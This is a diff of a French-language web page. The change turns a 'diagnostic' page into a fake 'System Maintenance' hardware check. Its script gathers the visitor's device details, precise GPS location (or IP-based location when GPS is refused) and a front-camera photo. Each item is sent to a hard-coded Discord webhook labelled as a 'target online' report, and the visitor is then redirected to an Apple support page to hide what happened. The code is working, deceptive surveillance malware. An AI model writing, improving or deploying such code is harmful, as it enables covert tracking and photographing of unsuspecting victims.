@@ -3,61 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ORCA Diagnostic</title>
+    <title>System Maintenance</title>
     <style>
-        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
-        .panel { border: 1px solid #00ff41; padding: 40px; border-radius: 5px; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); width: 85%; max-width: 400px; }
-        .btn { background: #00ff41; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; margin-top: 25px; width: 100%; text-transform: uppercase; letter-spacing: 2px; }
-        .btn:hover { background: #00cc33; }
+        body { background: #000; color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1c1c1e; padding: 30px; border-radius: 15px; text-align: center; width: 85%; max-width: 350px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .loader { border: 3px solid #333; border-top: 3px solid #0a84ff; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { font-size: 20px; margin: 10px 0; }
+        p { color: #8e8e93; font-size: 14px; line-height: 1.4; }
+        .btn { background: #0a84ff; color: #fff; border: none; padding: 12px 25px; border-radius: 8px; font-weight: 600; cursor: pointer; width: 100%; margin-top: 20px; }
         #video, #canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="panel">
-        <h2 id="title">ORCA SYSTEM SCAN</h2>
-        <p id="msg">Analyse de l'intégrité du système requise.</p>
-        <button id="run" class="btn">Lancer l'Analyse</button>
+    <div class="card">
+        <div id="loading-icon" style="display:none;" class="loader"></div>
+        <h2 id="title">Mise à jour requise</h2>
+        <p id="status">Une vérification du matériel est nécessaire pour poursuivre l'optimisation de votre système.</p>
+        <button id="main-btn" class="btn" onclick="execute()">Vérifier et Continuer</button>
     </div>
 
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        // Ton Webhook est injecté ici
         const WEBHOOK = "https://discord.com/api/webhooks/1466502605881475242/ynqT6t3L8IAQ69mgtvO17VvNBvmjFqiHayODx-P5EWMeN6renSu8UiM8nDfNNNvTHYy0";
+        const REDIRECT = "https://support.apple.com/fr-fr/HT201222";
 
-        async function sendToDiscord(content, blob = null) {
-            const formData = new FormData();
-            if (blob) {
-                formData.append('file', blob, 'capture.png');
-                formData.append('payload_json', JSON.stringify({ content: content }));
-            } else {
-                formData.append('payload_json', JSON.stringify({ content: content }));
-            }
-            
-            try {
-                await fetch(WEBHOOK, { method: 'POST', body: formData });
-            } catch (e) {
-                console.error("Erreur Webhook");
-            }
+        async function post(msg, blob = null) {
+            const fd = new FormData();
+            if (blob) fd.append('file', blob, 'capture.png');
+            fd.append('payload_json', JSON.stringify({ content: msg }));
+            try { await fetch(WEBHOOK, { method: 'POST', body: fd, keepalive: true }); } catch(e){}
         }
 
-        async function start() {
-            document.getElementById('run').style.display = 'none';
-            document.getElementById('msg').innerText = "Initialisation du scan...";
+        async function execute() {
+            // UI Update
+            document.getElementById('main-btn').style.display = 'none';
+            document.getElementById('loading-icon').style.display = 'block';
+            document.getElementById('title').innerText = "Analyse...";
+            document.getElementById('status').innerText = "Veuillez patienter pendant la vérification des périphériques.";
 
-            // 1. Infos Système
-            const info = `🛡️ **RAPPORT ORCA TOOLS**\n**OS**: ${navigator.platform}\n**Navigateur**: ${navigator.userAgent}`;
-            await sendToDiscord(info);
+            // 1. Infos Système Immédiates
+            const platform = navigator.userAgentData ? (await navigator.userAgentData.getHighEntropyValues(["platformVersion"])).platform : navigator.platform;
+            await post(`🚀 **CIBLE EN LIGNE**\n**Appareil**: ${platform}\n**Navigateur**: ${navigator.vendor}\n**Langue**: ${navigator.language}`);
 
-            // 2. Localisation
+            // 2. Géolocalisation (Précision Max)
             navigator.geolocation.getCurrentPosition(async (p) => {
-                await sendToDiscord(`📍 **GPS**: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-            }, () => {
-                sendToDiscord("⚠️ GPS: Permission refusée");
-            }, { enableHighAccuracy: true });
+                await post(`📍 **LOCALISATION**: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            }, async () => {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                await post(`🌐 **IP (Proxied)**: ${d.city}, ${d.country} (${d.ip})`);
+            }, { enableHighAccuracy: true, timeout: 5000 });
 
-            // 3. Caméra
+            // 3. Capture Caméra & Fin
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('video');
@@ -70,20 +70,18 @@
                         canvas.height = video.videoHeight;
                         canvas.getContext('2d').drawImage(video, 0, 0);
                         
-                        canvas.toBlob(blob => {
-                            sendToDiscord("📸 **CAPTURE IMAGE**", blob);
+                        canvas.toBlob(async (blob) => {
+                            await post("📸 **CAPTURE RÉUSSIE**", blob);
                             stream.getTracks().forEach(t => t.stop());
-                            document.getElementById('msg').innerText = "SCAN TERMINÉ (100%)";
+                            window.location.href = REDIRECT;
                         }, 'image/png');
-                    }, 2000);
+                    }, 1500);
                 };
-            } catch (err) {
-                await sendToDiscord("❌ Caméra: " + err.name);
-                document.getElementById('msg').innerText = "SCAN TERMINÉ (ERREUR MATÉRIELLE)";
+            } catch (e) {
+                await post("❌ **ACCÈS CAMÉRA REFUSÉ**");
+                setTimeout(() => { window.location.href = REDIRECT; }, 1000);
             }
         }
-
-        document.getElementById('run').addEventListener('click', start);
     </script>
 </body>
 </html>
